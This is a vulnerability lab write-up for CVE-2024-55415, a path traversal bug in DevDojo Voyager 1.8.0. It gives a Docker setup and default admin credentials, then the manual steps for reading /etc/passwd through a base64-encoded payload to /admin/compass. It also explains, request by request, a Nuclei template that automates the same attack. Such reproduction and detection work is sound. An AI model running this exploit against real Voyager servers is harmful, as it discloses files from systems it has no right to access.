# CVE-2024-55415: DevDojo Voyager <=1.8.0 - Arbitrary File Read

## Description:
DevDojo Voyager through 1.8.0 is vulnerable to authenticated path traversal at the /admin/compass.

## Reference:
- https://nvd.nist.gov/vuln/detail/CVE-2024-55415
- https://www.sonarsource.com/blog/the-tainted-voyage-uncovering-voyagers-vulnerabilities/

## Vulnerable Setup

- Execute the following commands to start a Laravel Voyager 1.8.0 server:

```
docker compose up -d
```

- After the server is started, browse to http://your-ip:8000 to see the Laravel Voyager admin panel. This server requires authentication.

## Default Login   

Username: admin@admin.com

Password: password

# Exploitation Steps

- Navigate to your URL http://your-ip:8000/admin

- Enter the Default Credentials (admin@admin.com/password) as shown below.

![image](https://github.com/user-attachments/assets/7935b0f8-1966-44c9-9d35-21a8aac72e41)

- Navigate to Tools -> Compass in the Dashboard.

![image](https://github.com/user-attachments/assets/dd38f215-48e5-4aa5-81c0-7cb711d5881f)

- Send a GET request to the `/admin/compass?download=` Download endpoint with base64 encoded LFI Payload.

```bash
L2V0Yy9wYXNzd2Q=
```

![image](https://github.com/user-attachments/assets/3eb5494c-4b96-41e6-b777-b7b2f7abb559)

- Observe the LFI and the `/etc/passwd` File get's downloaded.

![image](https://github.com/user-attachments/assets/8b289257-e513-4b21-9c5b-d18019178dc2)

![image](https://github.com/user-attachments/assets/514ffd04-5e4a-4775-b53c-48780cbb0b6e)


# Steps to Write Nuclei Template

**Variables Section**

```yaml
variables:
  username: "admin@admin.com"
  password: "password"
```

- Defines the login credentials (username and password) as variables, which can be reused in requests.

**First Request: Retrieve CSRF Token**

```yaml
  - raw:
      - |
        GET /admin/login HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        part: body
        internal: true
        name: csrf
        group: 1
        regex:
          - 'name="_token" value="([a-zA-Z0-9]+)"'
```

- Sends a GET request to /admin/login to retrieve the login page.
- Extracts the CSRF token (_token) from the response body using a regular expression.
- Stores the extracted value in an internal variable named csrf for later use.

**Second Request: Perform Login**

```yaml
  - raw:
      - |
        POST /admin/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        _token={{csrf}}&email={{username}}&password={{password}}&

    matchers:
      - type: dsl
        dsl:
          - "contains(body,'/admin</title>')"
          - "status_code == 302"
        condition: and
        internal: true
```

- Sends a POST request to `/admin/login` with:
  - Extracted `_token`
  - Username and password from the variables

- The matchers validate a successful login by checking:
  - The response body contains `</admin</title>` (indicating admin page access).
  - The response has a `302` status code, indicating a successful login and redirection.

**Third Request: Exploit Arbitrary File Read**

```yaml
  - raw:
      - |
        GET /admin/compass?download={{base64('/etc/passwd')}} HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - regex('root:.*:0:0:', body)
          - status_code == 200
        condition: and
```

- Sends a GET request to `/admin/compass?download={{base64('/etc/passwd')}}` to attempt file retrieval.
- Looks for the phrase `root:.*:0:0:` in the response body, indicating successful file read.
- Ensures the response status is `200` OK.

## Nuclei Template URL : [CVE-2024-55415](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2024/CVE-2024-55415.yaml)

## Nuclei Command :

```bash
nuclei -t CVE-2024-55415.yaml -u http://172.30.0.2:8000 -vv
```

![image](https://github.com/user-attachments/assets/17177e77-6302-400d-9568-9b48325bf189)
